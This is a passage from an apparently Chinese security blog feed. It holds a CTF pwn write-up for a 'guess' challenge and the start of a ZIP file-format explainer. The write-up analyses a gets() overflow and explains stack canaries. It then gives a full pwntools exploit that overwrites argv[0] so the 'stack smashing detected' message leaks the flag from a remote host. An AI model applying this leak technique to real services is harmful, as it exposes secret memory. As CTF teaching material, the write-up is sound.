class="line">  <span class="keyword">if</span> ( !stream )                                <span class="comment">// 打开失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);                  <span class="comment">// 关闭缓冲</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">60u</span>);</span><br><span class="line">  <span class="comment">// 设置流 stream 的文件位置为给定的偏移 offset，参数 offset 意味着从给定的 whence 位置查找的字节数。</span></span><br><span class="line">  fseek(stream, <span class="number">0L</span>L, <span class="number">2</span>);                        <span class="comment">// SEEK_END = 2</span></span><br><span class="line">  current_position = ftell(stream);             <span class="comment">// 返回给定流 stream 的当前文件位置。</span></span><br><span class="line">  fseek(stream, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  fgets(&amp;str, current_position + <span class="number">1</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please guess the flag:"</span>);</span><br><span class="line">  gets(input_flag);                             <span class="comment">// 输入flag,存在溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( current_position != (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(input_flag) )<span class="comment">// 验证flag长度</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"len error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(input_flag, <span class="string">"ZCTF&#123;"</span>, <span class="number">5u</span>LL) )      <span class="comment">// 验证flag开头</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"flag is start with ZCTF&#123;"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; current_position; ++i )      <span class="comment">// 输入的flag和真正的flag进行异或</span></span><br><span class="line">    *(&amp;str + i) ^= input_flag[i];</span><br><span class="line">  mark = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; current_position; ++j )      <span class="comment">// 如果输入的flag正确,则异或结果全部为0</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;str + j) )</span><br><span class="line">    &#123;</span><br><span class="line">      mark = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( mark )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are wrong"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看出<code>整个程序的逻辑</code>是这样的。首先，<code>读取</code>当前文件夹下的<code>flag文件</code>，从这个文件中读出<code>真正的flag</code>、以及<code>flag的长度</code>。然后提示用户输入flag，程序先验证<code>用户输入的flag的长度</code>是否正确，再将<code>用户输入的flag</code>与<code>flag文件中读出的flag</code>进行<code>异或</code>，根据<code>异或的结果</code>判断<code>输入的flag</code>是否是<code>正确的flag</code>。如果<code>异或的结果</code>每一个字节都为<code>&quot;\x00&quot;</code>，则<code>输入的flag正确</code>。反之，则不正确。</p><h3 id="0x20-编写exp"><a href="#0x20-编写exp" class="headerlink" title="0x20 编写exp"></a>0x20 编写exp</h3><h4 id="0x21-Stack-Smashing-Protector"><a href="#0x21-Stack-Smashing-Protector" class="headerlink" title="0x21 Stack Smashing Protector"></a>0x21 Stack Smashing Protector</h4><p>&emsp;&emsp;<code>Stack Smashing Protector</code>是一种众所周知的针对<code>基于栈的内存损坏的缓解措施</code>(例如：连续的缓冲区溢出)。也就是常说的<code>Canary</code>。</p><p>&emsp;&emsp;我们可以在编译程序的时候使用<code>“–fstack-protector”</code>或<code>“–fstack-protector-all”</code>开启它，使用<code>“–fno-stack-protector”</code>关闭它。</p><h4 id="0x22-开启了Stack-Smashing-Protector的程序特征"><a href="#0x22-开启了Stack-Smashing-Protector的程序特征" class="headerlink" title="0x22 开启了Stack Smashing Protector的程序特征"></a>0x22 开启了Stack Smashing Protector的程序特征</h4><p>&emsp;&emsp;开启了<code>Stack Smashing Protector</code>的程序会在<code>函数序言</code>和<code>函数尾声</code>添加一些汇编代码，如下所示：</p><p><strong><code>函数序言：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000000000040096D</span>     <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040096E     <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400971</span>     <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400972</span>     <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">58h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400976</span>     <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">fs</span>:<span class="number">28h</span>       -|</span><br><span class="line"><span class="symbol">.text:</span>000000000040097F     <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+canary], <span class="built_in">rax</span>  |向栈中写入Canary</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400983</span>     <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>          -|</span><br></pre></td></tr></table></figure></p><p><strong><code>函数尾声：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000400B6F loc_400B6F:                             </span><br><span class="line"><span class="symbol">.text:</span>0000000000400B6F     <span class="keyword">mov</span>     <span class="built_in">rbx</span>, [<span class="built_in">rbp</span>+canary]  -|</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B73     <span class="keyword">xor</span>     <span class="built_in">rbx</span>, <span class="built_in">fs</span>:<span class="number">28h</span>         |验证栈中的Canary</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B7C     <span class="keyword">jz</span>      short loc_400B83    |是否被修改</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B7E     <span class="keyword">call</span>    ___stack_chk_fail  -|</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B83 loc_400B83:                    </span><br><span class="line"><span class="symbol">.text:</span>0000000000400B83     <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">58h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B87     <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B88     <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B89     <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>fs:28h</code>中的值是<code>随机的</code>，每次程序启动都会不同，但在<code>某次程序运行过程中</code>，它是不会改变的。<code>Canary</code>在栈中的位置，一般是在<code>函数栈帧</code>的<code>ebp/rbp的上方</code>(低地址处)。当函数执行完功能后，会验证<code>栈上的Canary</code>是否被修改。如果<code>被修改</code>，会调用<code>__stack_chk_fail()</code>函数，__stack_chk_fail()函数内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到<code>__stack_chk_fail()</code>函数又调用了<code>__fortify_fail()</code>函数，其内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>msg</code>的内容为<code>“stack smashing detected”</code>，<code>__libc_argv[0]</code>的内容为<code>当前运行程序</code>的<code>名称字符串</code>。所以，如果<code>栈溢出</code>覆盖了<code>Canary</code>，则会输出以下字符串：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">**************************************</span><br><span class="line">test.c</span><br><span class="line">gcc test.c –fstack-protector -o test</span><br><span class="line">**************************************</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10</span>];</span><br><span class="line">    gets(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">$ ./test </span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*** <span class="built_in">stack</span> smashing detected ***: ./test terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">47585</span> <span class="built_in">abort</span> (core dumped)  ./test</span><br></pre></td></tr></table></figure></p><h4 id="0x23-利用Stack-Smashing-Protector泄露信息"><a href="#0x23-利用Stack-Smashing-Protector泄露信息" class="headerlink" title="0x23 利用Stack Smashing Protector泄露信息"></a>0x23 利用Stack Smashing Protector泄露信息</h4><p>&emsp;&emsp;如果将<code>__libc_argv[0]</code>中的<code>字符串指针</code>覆盖为<code>要泄露的信息的地址</code>，就可以泄露出想<code>要泄露出的信息</code>。</p><p><strong><code>利用思路：</code></strong></p><blockquote><p>1、构造<code>满足条件</code>(flag开头为ZCTF{)的<code>不同长度</code>的flag字符串，通过<code>返回信息</code>，来判断是否为<code>正确的flag的长度</code>。</p><p>2、泄露出<code>正确flag的长度</code>后，构造<code>满足条件</code>(flag开头为ZCTF{)及<code>正确长度</code>的flag，并用<code>“\x00”</code>作为flag字符串的结束，绕过<code>flag长度的验证</code>。然后，继续覆盖至<code>main函数</code>的参数<code>argv[0]</code>，将其覆盖为<code>&amp;str+0x5</code>(&amp;str为存储真实flag的地址)。因为前5个字节<code>“ZCTF{”</code>相同，所以，<code>异或后的结果</code>为<code>“\x00”</code>，只能从第6字节开始泄露。</p><p>3、<code>异或</code>在异或双方不同情况下是<code>可逆的</code>，所以我们需要选取一个<code>不在</code>正确flag中的字母，与<code>正确flag</code>的每一个字符进行<code>异或</code>。泄露出<code>异或后的结果字符串</code>后，再用<code>相同的字母</code>进行一次<code>异或</code>，就可以得到<code>正确的flag</code>。如果选取<code>正确flag中的字符</code>，异或后结果为<code>“\x00”</code>，泄漏时会造成<code>“\x00”截断</code>。我们需要不断尝试，找到一个<code>合适的异或数</code>。这里选用<code>“b”</code>。</p></blockquote><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 测试Flag: ZCTF&#123;welcome_to_zctf,i_love_you&#125;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./guess'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x40096D,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400A2F,ftell()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400A61,fgets()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400A83,gets()函数调用地址</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'220.249.52.133'</span>,<span class="number">34604</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./guess'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x40096D</span></span><br><span class="line"><span class="string">                                        bp 0x400A2F</span></span><br><span class="line"><span class="string">                                        bp 0x400A61</span></span><br><span class="line"><span class="string">                                        bp 0x400A83'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./guess'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(io,result)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        flag += chr(ord(i)^ord(<span class="string">'b'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Flag: ZCTF&#123;%s"</span>%flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_len</span><span class="params">(io,length)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"please guess the flag:\n"</span>)</span><br><span class="line">    flag_addr = <span class="number">0x6010C0</span></span><br><span class="line">    payload = <span class="string">'A'</span>*length + <span class="string">"\x00"</span></span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"len error"</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,length)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"please guess the flag:\n"</span>)</span><br><span class="line">    flag_addr = <span class="number">0x6010C0</span> + <span class="number">5</span></span><br><span class="line">    payload = <span class="string">"ZCTF&#123;"</span></span><br><span class="line">    payload = payload.ljust(length,<span class="string">'b'</span>)</span><br><span class="line">    payload += <span class="string">"\x00"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x7fffffffddb8</span> - <span class="number">0x7fffffffdc90</span>,<span class="string">'A'</span>)</span><br><span class="line">    payload += p64(flag_addr)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">    result = io.recvline()</span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    <span class="keyword">print</span> str_to_hex(result[<span class="number">0</span>:<span class="number">27</span>]) + result[<span class="number">27</span>:<span class="number">-1</span>] + str_to_hex(result[<span class="number">-1</span>:])</span><br><span class="line">    result = result.split(<span class="string">' terminated\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> str_to_hex(result)</span><br><span class="line">    xor(io,result)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span> <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    mark = <span class="number">0</span> <span class="comment"># mark = 1表示泄露flag长度</span></span><br><span class="line">    <span class="keyword">if</span> mark:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"*********************Start*********************"</span></span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"length:"</span>,i</span><br><span class="line">            <span class="keyword">if</span> leak_len(io,i) == <span class="keyword">True</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"**********************End**********************"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = <span class="number">32</span></span><br><span class="line">        io = get_io()</span><br><span class="line">        pwn(io,length)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ZIP文件格式分析</title>
      <link href="/2020/05/08/ZIP%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
      <url>/2020/05/08/ZIP%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>ZIP文件格式分析<br>刚分析完RAR文件格式，一想，干脆把ZIP文件格式也分析了吧<br>不过ZIP文件格式有官方文档，比较详细，这里也就是理解加翻译了一下。英文不好，菜哭。<br>后面有时间会加入实例分析环节。<br><a id="more"></a></p></blockquote><hr><h2 id="1、ZIP简介"><a href="#1、ZIP简介" class="headerlink" title="1、ZIP简介"></a>1、ZIP简介</h2><p>&emsp;&emsp;<code>ZIP文件格式</code>是一种<code>数据压缩</code>和<code>文档储存</code>的文件格式，原名<code>Deflate</code>，发明者为<code>菲尔·卡茨(Phil Katz)</code>，他于<code>1989年1月</code>公布了该格式的资料。该格式最初在PKWARE，Inc .的<code>PKZIP</code>实用程序中实现，替代了以前由Thom Henderson发明的<code>ARC压缩格式</code>。ZIP通常使用后缀名<code>“.zip”</code>，也使用<code>“.zipx ”</code>(较新的压缩算法)。ZIP被许多程序用作基本文件格式，通常使用不同的名称。它的<code>MIME格式</code>(Multipurpose Internet Mail Extensions)为<code>application/zip</code>。<br>&emsp;&emsp;目前，ZIP格式属于几种主流的压缩格式之一，其竞争者包括<code>RAR格式</code>以及开放源码的<code>7z格式</code>。从性能上比较，RAR及7z格式较ZIP格式<code>压缩率较高</code>，而7-Zip由于提供了免费的压缩工具而逐渐在更多的领域得到应用。Microsoft从<code>Windows ME</code>操作系统开始内置对zip格式的支持，即使用户的电脑上没有安装解压缩软件，也能打开和制作zip格式的压缩文件，<code>OS X</code>和流行的<code>Linux</code>操作系统也对zip格式提供了类似的支持。因此如果在网络上传播和分发文件，zip格式往往是最常用的选择。<br>&emsp;&emsp;ZIP是一种压缩文件格式，支持<code>无损数据压缩</code>。一个ZIP文件可能包含<code>一个或多个</code>已压缩的<code>文件</code>或<code>目录</code>。ZIP文件格式允许<code>多种压缩算法</code>。使用压缩时，必须使用已记录的压缩算法之一。<code>压缩方法8(Deflate)</code>是大多数ZIP兼容应用程序默认使用的方法。</p><h3 id="1-1、版本历史"><a href="#1-1、版本历史" class="headerlink" title="1.1、版本历史"></a>1.1、版本历史</h3><p>&emsp;&emsp;<code>.ZIP</code>文件格式规范具有其<code>自己的版本号</code>，该版本号不一定与<code>PKZIP工具的版本号</code>相对应，尤其是在<code>PKZIP 6</code>或<code>更高版本</code>中。在不同的时间，PKWARE添加了一些<code>初步功能</code>，这些功能允许PKZIP产品使用<code>高级功能</code>提取压缩文件，但是<code>创建</code>此类压缩文件的PKZIP产品要等到<code>下一个主要发行版本</code>才可用。其他<code>公司或组织</code>以自己的步调支持<code>PKWARE规范</code>。<br>&emsp;&emsp;<code>.ZIP</code>文件格式规范正式命名为“ <code>APPNOTE-.ZIP文件格式规范</code>”，并且自1990年代末开始在<code>PKWARE.com</code>网站上发布。该规范的多个版本尚未发布。某些功能的规范（例如<code>BZIP2压缩</code>，<code>强大的加密规范</code>(strong encryption specification)等）是在创建后几年由PKWARE发布的。在PKWARE网站上多次更改了在线规范的URL。</p><p><strong><code>各种版本的PKWARE规范的主要改进的摘要：</code></strong></p><ul><li><code>2.0</code> - (1993) 可以使用DEFLATE压缩文件条目，并使用传统的PKWARE加密(ZipCrypto)。</li><li><code>2.1</code> - (1996) Deflate64压缩。</li><li><code>4.5</code> - (2001) 已记录的64位zip格式。</li><li><code>4.6</code> - (2001) BZIP2压缩(直到APPNOTE 5.2发布时才在线发布)。</li><li><code>5.0</code> - (2002) SES：加密支持DES、Triple DES、RC2、RC4(直到APPNOTE 5.2发布时才在线发布)。</li><li><code>5.2</code> - (2003) SES(未在线发布的APPNOTE 5.1中定义)和WinZip(AE-x)的AES加密支持；SES加密支持的RC2-64的更正版本。</li><li><code>6.1</code> - (2004) 已记录的证书存储。</li><li><code>6.2.0</code> - (2004) 已记录的中心目录(Central Directory)加密。</li><li><code>6.3.0</code> - (2006) 已记录的Unicode(UTF-8)文件名存储。支持的哈希，压缩(LZMA，PPMd +)，加密算法的扩展列表。</li><li><code>6.3.1</code> - (2007) 已更正的SHA-256/384/512的标准哈希值。</li><li><code>6.3.2</code> - (2007) 已记录的压缩方法97(WavPack)。</li><li><code>6.3.3</code> - (2012) 文档格式更改，使用JTC 1/SC 34 N 1621指示的JTC 1参考解释性报告(RER)等方法，以方便从其他标准参考PKWARE应用说明。</li><li><code>6.3.4</code> - (2014) 更新PKWARE，Inc.官方地址。</li><li><code>6.3.5</code> - (2018) 已记录的压缩方法16、96和99，DOS时间戳时间和精度，为密钥和解密增加了额外字段，以及错别字和说明。</li><li><code>6.3.6</code> - (2019) 更正了印刷错误。</li></ul><p>&emsp;&emsp;<code>WinZip</code>从版本<code>12.1</code>开始，对于使用<code>压缩方法</code>比<code>DEFLATE</code>更新的ZIP文件使用扩展名<code>.zipx</code>。特别是方法<code>BZip</code>、<code>LZMA</code>、<code>PPMd</code>、<code>Jpeg</code>和<code>Wavpack</code>。当选择<code>“最佳方法”</code>压缩时，后两种将应用于适当的文件类型。</p><hr><h2 id="2、ZIP文件"><a href="#2、ZIP文件" class="headerlink" title="2、ZIP文件"></a>2、ZIP文件</h2><h3 id="2-1、什么是ZIP文件"><a href="#2-1、什么是ZIP文件" class="headerlink" title="2.1、什么是ZIP文件"></a>2.1、什么是ZIP文件</h3><p>&emsp;&emsp;ZIP文件可以由标准<code>.ZIP</code>文件扩展名标识，尽管不需要使用文件扩展名。使用<code>.ZIPX</code>扩展名也可以用于识别ZIP文件。其他使用<code>ZIP格式</code>的常见文件扩展名包括<code>.JAR</code>、<code>.WAR</code>、<code>.DOCX</code>、<code>.XLSX</code>、<code>.PPTX</code>、<code>.ODT</code>、<code>.ODS</code>、<code>.ODP</code>等。<code>读取</code>或<code>写入</code>ZIP文件的程序应依靠本文档中描述的<code>内部记录签名</code>来标识这种格式的文件。<br>&emsp;&emsp;ZIP文件应至少包含<code>一个文件</code>，并且可以包含<code>多个文件</code>。<br>&emsp;&emsp;<code>数据压缩</code>可以用来减少放置在ZIP文件中的文件的大小，但这<code>不是必需</code>的。此格式支持使用<code>多种数据压缩算法</code>。使用压缩时，必须使用<code>已记录</code>的压缩算法之一。建议实验者对他们的数据进行试验，以确定哪种可用算法可以提供最佳压缩以满足他们的需求。<code>压缩方法8(Deflate)</code>是大多数ZIP兼容应用程序<code>默认</code>使用的方法。<br>&emsp;&emsp;<code>数据加密</code>可以用来保护ZIP文件中的文件。在这种格式下，加密支持的<code>加密方法</code>包括<code>密码</code>和<code>公用/专用密钥</code>。可以<code>单独</code>使用或<code>结合</code>使用。加密可以应用于单个文件。可以通过加密ZIP文件的存储在<code>中心目录(Central Directory)中的元数据</code>来增加额外的安全性。<br>&emsp;&emsp;必须使用<code>CRC32</code>为每个文件提供<code>数据完整性</code>。<br>&emsp;&emsp;通过使用<code>数字签名</code>，可以包括<code>其他数据完整性</code>。 <code>单个文件</code>可以使用<code>一个</code>或<code>多个</code>数字签名进行签名。 <code>中心目录(Central Directory)</code>（如果签名）必须使用<code>单个</code>签名。<br>&emsp;&emsp;文件可以放在<code>未压缩</code>或<code>存储</code>的ZIP文件中。本文档中使用的术语“<code>存储</code>”是指文件被复制到未压缩的ZIP文件中。<br>&emsp;&emsp;放置在ZIP文件中的<code>每个数据文件</code>都可以进行<code>压缩</code>，<code>存储</code>，<code>加密</code>或与同一ZIP文件中其他数据文件的存档方式无关的<code>数字签名</code>。<br>&emsp;&emsp;ZIP文件可以<code>流式传输</code>，<code>分段</code>(在固定或可移动的媒体上)或“<code>自解压</code>”。 <code>自解压ZIP文件</code>必须在ZIP文件中包含<code>目标平台</code>的提取代码。<br>&emsp;&emsp;<code>ZIP的常见用法</code>或许还包括<code>清单文件的使用</code>。 <code>清单文件</code>将应用程序的特定信息存储在<code>已存储在ZIP文件中的文件</code>中。 这个<code>清单文件</code>应该是ZIP文件中的<code>第一个文件</code>。 